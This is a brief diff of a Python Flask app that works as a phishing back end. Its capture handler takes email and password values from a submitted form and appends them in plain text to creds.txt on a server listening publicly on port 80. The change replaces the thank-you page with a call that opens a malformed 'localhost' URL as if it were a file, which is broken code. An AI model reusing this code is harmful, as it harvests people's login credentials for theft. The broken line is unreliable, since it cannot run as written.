@@ -12,7 +12,7 @@ def capture():
     password = request.form.get("password")
     with open("creds.txt", "a") as f:
         f.write(f"Email: {email}, Password: {password}\\n")
-    return open("thank_you.html").read()
+    return open("http://localhost8125").read()
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=80, threaded=False)
